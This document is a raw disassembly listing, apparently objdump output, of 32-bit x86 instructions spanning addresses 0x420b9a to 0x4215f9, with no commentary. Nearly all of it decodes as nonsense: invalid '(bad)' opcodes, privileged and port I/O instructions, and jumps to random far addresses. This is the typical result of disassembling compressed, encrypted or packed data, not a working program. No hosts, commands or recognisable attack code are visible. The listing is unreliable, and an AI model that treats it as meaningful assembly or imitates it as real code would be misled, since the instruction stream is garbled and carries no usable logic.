  420b9a:	or     esp,DWORD PTR [esp+edx*4-0x348fd12]
  420ba1:	daa    
  420ba2:	pop    edi
  420ba3:	inc    ebp
  420ba4:	scas   al,BYTE PTR es:[edi]
  420ba5:	and    ebx,ebp
  420ba7:	dec    esp
  420ba8:	push   esp
  420ba9:	sub    BYTE PTR [edi-0x62e884cf],bl
  420baf:	inc    edi
  420bb0:	loope  0x420b7a
  420bb2:	rcr    DWORD PTR [edi],0xc4
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	and    eax,0xac7fb7eb
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [ebp+0x5e],cl
  420c30:	sub    BYTE PTR es:[esi+0x9],dl
  420c34:	mov    ds:0x6d3b95f5,al
  420c39:	pop    es
  420c3a:	fwait
  420c3b:	clc    
  420c3c:	jb     0x420c98
  420c3e:	int3   
  420c3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c40:	lea    ebx,[ebx-0x3995a66a]
  420c46:	(bad)  
  420c47:	dec    ebp
  420c48:	mov    ch,bh
  420c4a:	and    bl,BYTE PTR [eax]
  420c4c:	push   0x97d65f0
  420c51:	jecxz  0x420c8c
  420c53:	jecxz  0x420cc0
  420c55:	imul   esi,DWORD PTR [eax],0x18
  420c58:	fadd   QWORD PTR [esp+esi*8-0x3713353f]
  420c5f:	ins    DWORD PTR es:[edi],dx
  420c60:	dec    ebx
  420c61:	add    ch,al
  420c63:	aas    
  420c64:	add    BYTE PTR [esi-0x56],0x99
  420c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c69:	push   ss
  420c6a:	mov    ds:0x6a260501,al
  420c6f:	pop    edx
  420c70:	hlt    
  420c71:	xchg   esi,eax
  420c72:	sbb    bl,BYTE PTR [edx-0x3f]
  420c75:	xlat   BYTE PTR ds:[ebx]
  420c76:	fst    DWORD PTR [edx-0x391db0cb]
  420c7c:	fldcw  WORD PTR [edi+0x74]
  420c7f:	sbb    al,0x68
  420c81:	sub    DWORD PTR [edi],esi
  420c83:	scas   eax,DWORD PTR es:[edi]
  420c84:	lods   al,BYTE PTR ds:[esi]
  420c85:	leave  
  420c86:	scas   al,BYTE PTR es:[edi]
  420c87:	pop    ebp
  420c88:	add    al,0x55
  420c8a:	mov    esi,0xb9c35bd
  420c8f:	and    DWORD PTR [ecx],ecx
  420c91:	scas   al,BYTE PTR es:[edi]
  420c92:	xlat   BYTE PTR ds:[ebx]
  420c93:	xor    edi,ecx
  420c95:	adc    BYTE PTR [ecx+ebx*1+0x461c19e0],0xec
  420c9d:	cmp    BYTE PTR [edx],bh
  420c9f:	test   eax,0x6028b8db
  420ca4:	mov    ebx,DWORD PTR [edx]
  420ca6:	mov    edx,0xfdc7c2e9
  420cab:	push   eax
  420cac:	into   
  420cad:	mov    bl,0x3d
  420caf:	mov    WORD PTR [ebx+eiz*2-0x4ed35e88],fs
  420cb6:	pop    edi
  420cb7:	fcom   DWORD PTR [eax]
  420cb9:	std    
  420cba:	and    al,0xa2
  420cbc:	adc    esi,DWORD PTR [esi]
  420cbe:	adc    bh,BYTE PTR [eax]
  420cc0:	mov    bl,0xb2
  420cc2:	pusha  
  420cc3:	jo     0x420c4f
  420cc5:	das    
  420cc6:	fs dec ebp
  420cc8:	mov    WORD PTR [ebx+0x2],gs
  420ccb:	mov    eax,ds:0xb56ff3bd
  420cd0:	inc    esp
  420cd1:	inc    edx
  420cd2:	add    edx,DWORD PTR [ebx]
  420cd4:	push   esp
  420cd5:	pop    ebx
  420cd6:	cmp    bh,ch
  420cd8:	out    dx,eax
  420cd9:	scas   eax,DWORD PTR es:[edi]
  420cda:	ficomp DWORD PTR [esp+ecx*2]
  420cdd:	sti    
  420cde:	nop
  420cdf:	adc    ebx,DWORD PTR es:[ebx]
  420ce2:	mov    ah,0x63
  420ce4:	mov    edi,0x370440a3
  420ce9:	iret   
  420cea:	das    
  420ceb:	lds    esp,FWORD PTR [ebx+edx*1]
  420cee:	sti    
  420cef:	std    
  420cf0:	push   ss
  420cf1:	mov    DWORD PTR [ecx],edi
  420cf3:	gs test eax,0x2ebf7b69
  420cf9:	lea    eax,[ecx]
  420cfb:	inc    edi
  420cfc:	sbb    bl,BYTE PTR [edx+0x27624454]
  420d02:	ins    DWORD PTR es:[edi],dx
  420d03:	and    al,0xe3
  420d05:	mov    eax,0xed60a9d9
  420d0a:	lock cli 
  420d0c:	mov    ds:0x6f03e600,al
  420d11:	idiv   DWORD PTR ds:0x168d1c43
  420d17:	inc    ecx
  420d18:	stc    
  420d19:	sbb    esp,ebp
  420d1b:	aas    
  420d1c:	ficom  WORD PTR [edx-0x43]
  420d1f:	test   al,0xe3
  420d21:	dec    ebx
  420d22:	sub    BYTE PTR [edi+0x5758e6c1],al
  420d28:	pusha  
  420d29:	mov    al,ds:0x180becca
  420d2e:	mov    ecx,0x36d8f1d4
  420d33:	inc    edx
  420d34:	mov    esi,0x0
	...
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0xc1cea
  420da3:	xor    eax,0x5cb3acb2
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [edx-0x46],dl
  420db0:	and    BYTE PTR [esi+0x2a9c9430],ah
  420db6:	push   cs
  420db7:	xor    BYTE PTR [esi-0x63],dl
  420dba:	clc    
  420dbb:	mov    al,ds:0x976ba78d
  420dc0:	jnp    0x420dca
  420dc2:	fsubr  QWORD PTR [esi+0x75]
  420dc5:	in     eax,dx
  420dc6:	cmp    BYTE PTR [esi],dh
  420dc8:	mov    es,WORD PTR [ebx]
  420dca:	out    0xcc,al
  420dcc:	ins    BYTE PTR es:[edi],dx
  420dcd:	(bad)  
  420dce:	xor    DWORD PTR [edx-0x2a98ad62],edx
  420dd4:	adc    al,BYTE PTR [edi-0x54]
  420dd7:	gs and eax,0x6366f81a
  420ddd:	sub    al,0x15
  420ddf:	push   ebx
  420de0:	inc    ebp
  420de1:	adc    eax,esi
  420de3:	push   ebx
  420de4:	jb     0x420d69
  420de6:	inc    ecx
  420de7:	add    edi,DWORD PTR [ebx]
  420de9:	jmp    0xa06cd522
  420dee:	jmp    0x420d9c
  420df0:	mov    eax,ds:0x786d2784
  420df5:	mov    ebp,0x57eab860
  420dfa:	mov    dh,ch
  420dfc:	xor    cl,ch
  420dfe:	popf   
  420dff:	dec    esi
  420e00:	retf   0x5a7b
  420e03:	jmp    0x6f734f0d
  420e08:	and    DWORD PTR [eax],esp
  420e0a:	pop    ss
  420e0b:	lock sbb al,0xef
  420e0e:	fist   DWORD PTR ds:0x34740420
  420e14:	push   0x36
  420e16:	jnp    0x420d9d
  420e18:	clc    
  420e19:	mov    edx,0xd2f67e39
  420e1e:	xor    dl,BYTE PTR [esi+0x36710fe8]
  420e24:	sub    eax,0xbf1314f2
  420e29:	lods   eax,DWORD PTR ds:[esi]
  420e2a:	mov    edi,ebx
  420e2c:	adc    ebx,edx
  420e2e:	icebp  
  420e2f:	inc    esp
  420e30:	(bad)  
  420e31:	hlt    
  420e32:	mov    ds:0x1136ff3f,al
  420e37:	ss aad 0xe9
  420e3a:	or     al,0x91
  420e3c:	inc    ebp
  420e3d:	mov    ah,0xf6
  420e3f:	aam    0x6c
  420e41:	xor    dl,ch
  420e43:	stos   DWORD PTR es:[edi],eax
  420e44:	inc    esp
  420e45:	(bad)  
  420e46:	dec    edi
  420e47:	inc    esi
  420e48:	test   BYTE PTR [ebp+0x5e20d57c],bl
  420e4e:	test   al,0x88
  420e50:	lods   eax,DWORD PTR ds:[esi]
  420e51:	mov    cl,0x49
  420e53:	or     DWORD PTR [ebp+edx*1-0x7b],ebp
  420e57:	fmul   DWORD PTR [edx-0x7d]
  420e5a:	mov    edx,0x703d0e30
  420e5f:	mov    bl,0xf4
  420e61:	or     BYTE PTR [eax-0xd2702af],0x2e
  420e68:	jl     0x420ed5
  420e6a:	pop    ecx
  420e6b:	lock mov cl,BYTE PTR [ecx-0x6335a6cc]
  420e72:	xor    BYTE PTR [eax+0x7e],cl
  420e75:	pop    esp
  420e76:	and    dl,0x2e
  420e79:	fsub   QWORD PTR [ebp+edx*1+0x8]
  420e7d:	out    dx,eax
  420e7e:	clc    
  420e7f:	fisub  DWORD PTR [edx+0x55]
  420e82:	lahf   
  420e83:	inc    ebp
  420e84:	mov    cl,BYTE PTR [esi+ebx*4+0x2d02afcf]
  420e8b:	sahf   
  420e8c:	and    BYTE PTR [edi-0x23c137bb],bh
  420e92:	adc    ah,BYTE PTR [esi+0x4f]
  420e95:	jne    0x420e33
  420e97:	retf   0x5cc4
  420e9a:	sub    al,0x1a
  420e9c:	scas   eax,DWORD PTR es:[edi]
  420e9d:	sbb    eax,0xc840fa0d
  420ea2:	dec    ebp
  420ea3:	(bad)  
  420ea4:	in     al,0x8f
  420ea6:	das    
  420ea7:	mov    ebp,0xb2835dc8
  420eac:	stc    
  420ead:	mov    ecx,0x5b497b85
  420eb2:	dec    ecx
  420eb3:	fs jns 0x420eb6
	...
  420f16:	and    BYTE PTR [edi-0x28082cbe],dl
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	xor    DWORD PTR ds:[ebx],ebp
  420f24:	(bad)  
  420f25:	sti    
  420f26:	mov    edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [ebx],ah
  420f2f:	pop    ebx
  420f30:	aad    0x66
  420f32:	cmp    DWORD PTR es:[edx-0x6f48fb9e],edi
  420f39:	push   DWORD PTR [edx]
  420f3b:	mov    bl,0xa7
  420f3d:	test   eax,0x75074814
  420f42:	loope  0x420f05
  420f44:	dec    esp
  420f45:	adc    dl,BYTE PTR [ebx]
  420f47:	ficomp DWORD PTR [ebx-0x59]
  420f4a:	xor    dl,bl
  420f4c:	repz fcmove st,st(3)
  420f4f:	push   ss
  420f50:	into   
  420f51:	xor    DWORD PTR [ecx],esi
  420f53:	popf   
  420f54:	sub    al,0xa3
  420f56:	or     esi,DWORD PTR [ebx+0x5c]
  420f59:	sbb    dl,0x35
  420f5c:	ror    BYTE PTR [edi+0x1ad8d2b2],0x59
  420f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f64:	jb     0x420f2d
  420f66:	sub    ch,BYTE PTR [eax-0x26fdd8d]
  420f6c:	dec    eax
  420f6d:	mov    ds:0x56f76db1,al
  420f72:	inc    edx
  420f73:	arpl   WORD PTR [ebp-0x2a02fed0],bp
  420f79:	mov    dh,0x53
  420f7b:	xor    dh,0xa4
  420f7e:	aas    
  420f7f:	mov    bh,0x1c
  420f81:	iret   
  420f82:	repz in al,dx
  420f84:	inc    eax
  420f85:	leave  
  420f86:	int    0x65
  420f88:	sbb    BYTE PTR [edi-0x58d59a9c],dl
  420f8e:	mov    fs,ebp
  420f90:	pop    edi
  420f91:	call   DWORD PTR [bx+si-0x15]
  420f95:	jbe    0x420fd2
  420f97:	mov    ch,dh
  420f99:	adc    eax,ebx
  420f9b:	sbb    DWORD PTR [ebx-0x4fd8e950],eax
  420fa1:	jl     0x420f94
  420fa3:	mov    ecx,0xb4b64b91
  420fa8:	or     eax,0x28b88083
  420fad:	mov    eax,DWORD PTR [esi+ebx*1-0x59184821]
  420fb4:	push   ebx
  420fb5:	leave  
  420fb6:	icebp  
  420fb7:	mov    eax,0x6f2060af
  420fbc:	(bad)  
  420fbd:	cmc    
  420fbe:	aad    0xfe
  420fc0:	fs sub eax,0x6e8ee807
  420fc6:	addr16 mov cl,0x97
  420fc9:	mov    DWORD PTR [ebp+0x7b9be0ae],ebx
  420fcf:	inc    ebx
  420fd0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420fd2:	mov    bl,bh
  420fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd5:	das    
  420fd6:	out    0xbb,eax
  420fd8:	push   esp
  420fd9:	cwd    
  420fdb:	mov    bh,0x5f
  420fdd:	cli    
  420fde:	or     al,BYTE PTR [ecx-0x18149a86]
  420fe4:	pop    ds
  420fe5:	adc    al,BYTE PTR ds:0xfaed189
  420feb:	iret   
  420fec:	push   ecx
  420fed:	mov    esp,esp
  420fef:	mov    bl,0x7d
  420ff1:	or     al,ch
  420ff3:	add    DWORD PTR [ebp-0x5987c43e],0x8
  420ffa:	mov    ecx,0x28432706
  420fff:	cld    
  421000:	xor    DWORD PTR [ebx+eiz*2+0xa9f8a21],0x602abe53
  42100b:	dec    esp
  42100c:	mov    BYTE PTR [edx-0x7edd3336],bh
  421012:	(bad)  
  421013:	in     al,0x36
  421015:	sar    DWORD PTR [ebp+0x53],1
  421018:	mov    BYTE PTR [edx+0x1d],ah
  42101b:	data16 jmp 0x42106f
  42101e:	cmp    BYTE PTR ds:0x26ae77c7,0xcd
  421025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421026:	rcl    DWORD PTR [edx+0x32],0x42
  42102a:	outs   dx,DWORD PTR ds:[esi]
  42102b:	sub    eax,0x237d157b
  421030:	xor    ah,ah
  421032:	inc    ebp
  421033:	iret   
  421034:	js     0x421036
	...
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x2106c3fe
  4210a5:	aas    
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [edx],ch
  4210af:	outs   dx,BYTE PTR cs:[esi]
  4210b1:	stc    
  4210b2:	imul   DWORD PTR [ecx]
  4210b4:	pop    ebp
  4210b5:	pop    ebp
  4210b6:	mov    ch,0x56
  4210b8:	mov    edx,0xdd083e7c
  4210bd:	fwait
  4210be:	popa   
  4210bf:	and    dl,BYTE PTR [esp+esi*8+0x57eccde9]
  4210c6:	loop   0x42108a
  4210c8:	mov    ecx,0xb0d5ef37
  4210cd:	je     0x421103
  4210cf:	push   ss
  4210d0:	adc    eax,0x2b3534cb
  4210d5:	dec    eax
  4210d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210d7:	mov    ebp,0xaeb19ce9
  4210dc:	cmp    bl,BYTE PTR [ebp-0x56a975ef]
  4210e2:	dec    ebx
  4210e3:	fiadd  DWORD PTR [esi]
  4210e5:	fwait
  4210e6:	ds mov eax,es:0x2761ebe4
  4210ed:	add    DWORD PTR [edx-0x655c3340],ebx
  4210f3:	mov    ah,0x30
  4210f5:	fld    QWORD PTR [edx-0x9]
  4210f8:	pop    ebp
  4210f9:	outs   dx,BYTE PTR ds:[esi]
  4210fa:	pop    edx
  4210fb:	repz lahf 
  4210fd:	pop    edx
  4210fe:	retf   
  4210ff:	ds repz mov eax,0x7e678597
  421106:	mov    esp,0x41717e7b
  42110b:	ret    
  42110c:	xor    ch,BYTE PTR [ebx+edx*4]
  42110f:	out    0x2,al
  421111:	jge    0x421159
  421113:	push   eax
  421114:	mov    ebp,0x65346b0f
  421119:	int    0x50
  42111b:	jo     0x4210f3
  42111d:	pop    ds
  42111e:	test   al,0x66
  421120:	(bad)  
  421121:	mov    ch,0x7
  421123:	push   0xffffff9d
  421125:	jbe    0x421106
  421127:	jp     0x42114f
  421129:	xor    BYTE PTR [edx-0x4fc8d7a7],ch
  42112f:	shr    DWORD PTR [edx+0x71],0x9e
  421133:	jno    0x42115c
  421135:	jnp    0x42117b
  421137:	ja     0x4210df
  421139:	fsub   QWORD PTR [ebp+0x678c64fd]
  42113f:	mov    BYTE PTR ds:0x562e3eaf,cl
  421145:	jmp    0xd846f064
  42114a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42114b:	dec    al
  42114d:	inc    ebp
  42114e:	jo     0x42119f
  421150:	or     edx,DWORD PTR [esi+0x7670bcba]
  421156:	int3   
  421157:	jg     0x42117e
  421159:	and    al,0x7b
  42115b:	push   esi
  42115c:	sub    eax,0x8c24dd13
  421161:	adc    al,0x82
  421163:	push   0x6c89e8f
  421168:	loope  0x421176
  42116a:	rol    DWORD PTR [eax],cl
  42116c:	fisub  WORD PTR [edi+0x23c5336f]
  421172:	mov    eax,ds:0x6d421d13
  421177:	shr    BYTE PTR [ecx+edx*1+0x5e],0xb8
  42117c:	jo     0x421142
  42117e:	jae    0x4211a7
  421180:	jle    0x8444a890
  421186:	lds    ebx,FWORD PTR [edi-0x71]
  421189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42118a:	pop    ecx
  42118b:	xchg   esp,eax
  42118c:	push   esp
  42118d:	mov    ch,0xe4
  42118f:	call   0x573d85
  421194:	inc    eax
  421195:	sar    edi,0xbf
  421198:	and    dl,al
  42119a:	xchg   esp,eax
  42119b:	mov    ds,WORD PTR [edx]
  42119d:	xchg   edi,eax
  42119e:	in     al,0xe
  4211a0:	out    0x7c,eax
  4211a2:	ds adc eax,0xada56241
  4211a8:	loopne 0x4211a8
  4211aa:	jbe    0x421229
  4211ac:	(bad)  
  4211ae:	lods   eax,DWORD PTR ds:[esi]
  4211af:	sub    BYTE PTR ds:0x1feb13a5,dl
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx+0x8],cl
  421223:	sahf   
  421224:	or     eax,0x15fc815
  421229:	add    BYTE PTR [edi],al
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR ds:0xe99c3af4,al
  421233:	in     eax,dx
  421234:	pop    esp
  421235:	nop
  421236:	jg     0x4211be
  421238:	scas   eax,DWORD PTR es:[edi]
  421239:	mov    bl,0x80
  42123b:	or     BYTE PTR [edi],dl
  42123d:	pusha  
  42123e:	cld    
  42123f:	xor    eax,0xa6e9cd1e
  421244:	xor    edi,esp
  421246:	std    
  421247:	fcom   QWORD PTR [edi]
  421249:	xchg   ebp,eax
  42124a:	(bad)  
  42124b:	push   0x3a2f9b79
  421250:	mov    ebp,ebx
  421252:	jnp    0x421217
  421254:	push   esi
  421255:	xchg   edi,eax
  421256:	or     eax,0x2488998d
  42125b:	test   BYTE PTR [edi+0x71f32e94],ch
  421261:	scas   eax,DWORD PTR es:[edi]
  421262:	push   cs
  421263:	dec    ebx
  421264:	rcr    BYTE PTR [edi],1
  421266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421267:	aas    
  421268:	gs (bad) 
  42126a:	neg    esp
  42126c:	add    al,0xe5
  42126e:	xlat   BYTE PTR ds:[ebx]
  42126f:	clc    
  421270:	cdq    
  421271:	push   edx
  421272:	mov    edi,0x4ebe106a
  421277:	jnp    0x42124f
  421279:	arpl   WORD PTR [eax],si
  42127b:	es (bad) 
  42127d:	in     al,dx
  42127e:	xchg   esp,eax
  42127f:	pop    ds
  421280:	add    DWORD PTR [eax+edi*1-0x60],edx
  421284:	mov    ?,WORD PTR [ebx+0x56]
  421287:	popa   
  421288:	jb     0x421276
  42128a:	cmp    al,0x29
  42128c:	popa   
  42128d:	test   eax,0x3ed0a0a8
  421292:	loop   0x4212eb
  421294:	imul   ecx,DWORD PTR [eax+0x6cb69f53],0xffffff83
  42129b:	lds    ecx,FWORD PTR [edx-0x6e]
  42129e:	sub    edi,DWORD PTR [edx-0x73]
  4212a1:	inc    ecx
  4212a2:	adc    bh,dl
  4212a4:	push   es
  4212a5:	test   DWORD PTR [ebx-0x73],ebp
  4212a8:	dec    esi
  4212a9:	pop    edi
  4212ab:	in     eax,dx
  4212ac:	into   
  4212ad:	ret    
  4212ae:	cmp    bl,dl
  4212b0:	add    eax,0x78bd916c
  4212b5:	test   DWORD PTR [esi],edi
  4212b7:	adc    al,0xa0
  4212b9:	les    ebp,FWORD PTR [ebx]
  4212bb:	adc    al,0x79
  4212bd:	xor    DWORD PTR [ecx-0x516d9e68],ecx
  4212c3:	and    BYTE PTR [eax-0x33afa36a],dl
  4212c9:	jno    0x4212e7
  4212cb:	dec    ecx
  4212cc:	cdq    
  4212cd:	or     BYTE PTR [ebx+0x5327fc6f],ah
  4212d3:	jge    0x421329
  4212d5:	mov    dh,0x69
  4212d7:	ds mov ah,0x94
  4212da:	bts    DWORD PTR [ebp+0x326290a0],eax
  4212e1:	test   DWORD PTR [eax],edi
  4212e3:	scas   eax,DWORD PTR es:[edi]
  4212e4:	jge    0x421346
  4212e6:	mov    BYTE PTR [ebp+0x59],dl
  4212e9:	out    0xe5,eax
  4212eb:	ins    BYTE PTR es:[edi],dx
  4212ec:	pop    esp
  4212ed:	sbb    eax,0xaef6dec4
  4212f2:	jne    0x42130a
  4212f4:	fist   DWORD PTR ds:0x29f8c76d
  4212fa:	neg    DWORD PTR [esp+esi*8+0x4b]
  4212fe:	xor    eax,0x7f948929
  421303:	mov    WORD PTR [ebx+0x52],ds
  421306:	sti    
  421307:	iret   
  421308:	mov    WORD PTR [edx],gs
  42130a:	push   ecx
  42130b:	jmp    0x421325
  42130d:	fisub  DWORD PTR [ebx-0x1f6d8e56]
  421313:	cmp    al,0xe3
  421315:	or     al,BYTE PTR [esp+ebx*2]
  421318:	sar    DWORD PTR [edi+0x38],1
  42131b:	shl    DWORD PTR [eax+0x32],1
  42131e:	int    0x2f
  421320:	xchg   ebx,eax
  421321:	retf   0x9f
  421324:	mov    dh,0x24
  421326:	shr    BYTE PTR [edi-0x5c176b59],1
  42132c:	sbb    al,0x16
  42132e:	hlt    
  42132f:	ror    BYTE PTR [eax-0x59b51a97],1
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xef6c04b0
  4213a3:	push   edi
  4213a4:	sub    BYTE PTR [edx+0x160cf],ch
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ebx],al
  4213af:	xor    cl,0xfb
  4213b2:	std    
  4213b3:	inc    edi
  4213b4:	mov    edx,esp
  4213b6:	push   esi
  4213b7:	xor    cl,al
  4213b9:	push   ecx
  4213ba:	sbb    DWORD PTR [esi+0x33fc386c],edi
  4213c0:	push   ebx
  4213c1:	scas   al,BYTE PTR es:[edi]
  4213c2:	jge    0x4213a4
  4213c4:	adc    DWORD PTR [eax],ebp
  4213c6:	sub    BYTE PTR [edx+eiz*1+0x6c],bl
  4213ca:	popa   
  4213cb:	xchg   ebp,eax
  4213cc:	ja     0x4213ad
  4213ce:	ins    BYTE PTR es:[edi],dx
  4213cf:	(bad)  
  4213d0:	in     al,dx
  4213d1:	pop    es
  4213d2:	rol    esp,0xa8
  4213d5:	(bad)  
  4213d6:	jne    0x4213d9
  4213d8:	mov    ?,WORD PTR [esi+0x1f5f1c89]
  4213de:	(bad)  
  4213df:	dec    esp
  4213e0:	mov    dh,0x4
  4213e2:	push   cs
  4213e3:	cmp    ah,BYTE PTR [edx-0x73]
  4213e6:	cmp    ecx,DWORD PTR [ecx]
  4213e8:	in     eax,0xf9
  4213ea:	ret    0xa066
  4213ed:	retf   0xec8a
  4213f0:	mov    ds:0x6445228a,eax
  4213f5:	push   cs
  4213f6:	outs   dx,DWORD PTR ds:[esi]
  4213f7:	(bad)  
  4213f8:	jne    0x4213cb
  4213fa:	dec    ecx
  4213fb:	mov    cl,0xc9
  4213fd:	fmul   DWORD PTR [eax+ecx*1]
  421400:	cmc    
  421401:	popa   
  421402:	lea    ecx,[ebx]
  421404:	les    ebx,FWORD PTR [ecx-0xcd876b]
  42140a:	out    0xab,eax
  42140c:	mov    ebx,0x2c25f7a7
  421411:	sub    DWORD PTR [edx+0x49],esi
  421414:	jno    0x4213f4
  421416:	dec    ebx
  421417:	inc    esp
  421418:	enter  0xf4ab,0x77
  42141c:	pushf  
  42141d:	pop    ss
  42141e:	jmp    0x644810c2
  421423:	mov    bl,0x97
  421425:	sub    eax,0x9b1ba076
  42142a:	mov    eax,DWORD PTR [ebx]
  42142c:	out    0x61,eax
  42142e:	or     bh,BYTE PTR [eax+0x50]
  421431:	dec    edx
  421432:	(bad)  [ebp+0x4e617551]
  421438:	sbb    ebx,DWORD PTR [edx-0x29f1df72]
  42143e:	fisttp QWORD PTR [edi-0x4aa8e165]
  421444:	bound  edi,QWORD PTR [esi]
  421446:	and    DWORD PTR [ebp+0x54a966d0],ecx
  42144c:	dec    ecx
  42144d:	cmp    al,0x5a
  42144f:	cdq    
  421450:	sub    BYTE PTR [ebx-0xf],dh
  421453:	mov    ah,BYTE PTR [edx+0x44]
  421456:	push   ebx
  421457:	(bad)  
  421458:	loopne 0x42142e
  42145a:	mov    WORD PTR [ebp-0x3004c996],ds
  421460:	jmp    0x7d0c9ec9
  421465:	mov    BYTE PTR [ebx+0x5aa7c9f],cl
  42146b:	inc    ebx
  42146c:	test   eax,0xb893c73c
  421471:	jns    0x42145b
  421473:	xchg   BYTE PTR [ebp+0x4e45c7ef],al
  421479:	pop    fs
  42147b:	or     al,0xf2
  42147d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42147e:	mov    ebx,0x426ca857
  421483:	add    al,0xc8
  421485:	hlt    
  421486:	das    
  421487:	add    dh,BYTE PTR [ecx+0x1e]
  42148a:	scas   eax,DWORD PTR es:[edi]
  42148b:	sub    ebp,DWORD PTR [ecx+ecx*2]
  42148e:	push   ds
  42148f:	lods   al,BYTE PTR ds:[esi]
  421490:	mov    eax,0xd991f0e2
  421495:	mov    ch,0x30
  421497:	xor    eax,0xe936600d
  42149c:	imul   esp,eax,0x22a250d0
  4214a2:	mov    BYTE PTR [eax*8-0x6bf98d16],ch
  4214a9:	jle    0x421481
  4214ab:	adc    BYTE PTR [eax-0x5c],ch
  4214ae:	mov    bh,0xed
  4214b0:	push   esp
  4214b1:	pop    es
  4214b2:	xchg   edx,eax
  4214b3:	int    0xa9
	...
  421515:	add    dh,dl
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	out    0xf1,al
  421524:	(bad)  
  421525:	ins    BYTE PTR es:[edi],dx
  421526:	(bad)  
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [edi+0x43d17d00],bh
  421533:	mov    bl,0xb9
  421535:	lea    ebx,[ecx-0x77cf058b]
  42153b:	push   es
  42153c:	test   BYTE PTR [ecx],ah
  42153e:	hlt    
  42153f:	(bad)
  421542:	sub    al,0x29
  421544:	ja     0x421541
  421546:	cmc    
  421547:	mul    BYTE PTR [ebp-0x771d61cf]
  42154d:	xor    DWORD PTR [edx],esp
  42154f:	ja     0x4215cb
  421551:	out    dx,al
  421552:	adc    eax,0x8377b59f
  421557:	adc    BYTE PTR fs:[eax+0x18c55af5],0x9c
  42155f:	xchg   edi,eax
  421560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421561:	xchg   ebx,eax
  421562:	sub    al,0xb
  421564:	jle    0x4214e7
  421566:	imul   edi,DWORD PTR [ecx+ecx*8-0x73],0xffffffd3
  42156b:	pop    ebp
  42156c:	popa   
  42156d:	stc    
  42156e:	cmp    bh,dl
  421570:	mov    bl,0x1d
  421573:	jmp    0xc6b9:0xfabe38d1
  42157a:	fst    DWORD PTR [eax]
  42157c:	pop    esp
  42157d:	add    ebp,DWORD PTR [ecx]
  42157f:	lahf   
  421580:	jnp    0x421551
  421582:	int    0xe8
  421584:	or     bl,BYTE PTR [ecx+0xa]
  421587:	add    ebx,eax
  421589:	mov    al,0xcc
  42158b:	push   ds
  42158c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42158d:	sbb    al,0xec
  42158f:	out    0x3e,al
  421591:	shl    DWORD PTR [esi-0x66],cl
  421594:	dec    esi
  421595:	sahf   
  421596:	enter  0x3680,0x7d
  42159a:	cdq    
  42159b:	push   ds
  42159c:	inc    esp
  42159d:	cdq    
  42159e:	shr    BYTE PTR [ebx],cl
  4215a0:	adc    cl,ch
  4215a2:	cmp    al,0xca
  4215a4:	xchg   BYTE PTR [ecx+0x32403780],bh
  4215aa:	call   0xd7ed9e01
  4215af:	pop    eax
  4215b0:	mov    al,0xdb
  4215b2:	xor    cl,cl
  4215b4:	and    ah,BYTE PTR [edi-0x4b]
  4215b7:	dec    esi
  4215b8:	ds int 0x9a
  4215bb:	push   ss
  4215bc:	out    dx,al
  4215bd:	aad    0x8d
  4215bf:	ret    
  4215c0:	adc    eax,0x69df3fe4
  4215c5:	dec    ebp
  4215c6:	call   0x125b7a33
  4215cb:	sahf   
  4215cc:	mov    ah,0xfd
  4215ce:	in     al,0x19
  4215d0:	or     bh,BYTE PTR [edx]
  4215d2:	and    BYTE PTR ss:[eax+0x8],bh
  4215d6:	loopne 0x4215f7
  4215d8:	jp     0x421633
  4215da:	jmp    0x613e:0x153e0254
  4215e1:	inc    ecx
  4215e2:	das    
  4215e3:	test   esi,ecx
  4215e5:	ins    WORD PTR es:[edi],dx
  4215e7:	push   ebx
  4215e8:	or     eax,0xbeaeb257
  4215ed:	jg     0x4215ce
  4215ef:	mov    bh,0xc6
  4215f1:	in     eax,dx
  4215f2:	or     ebx,esp
  4215f4:	cmp    eax,0x11dec8be
  4215f9:	hlt    
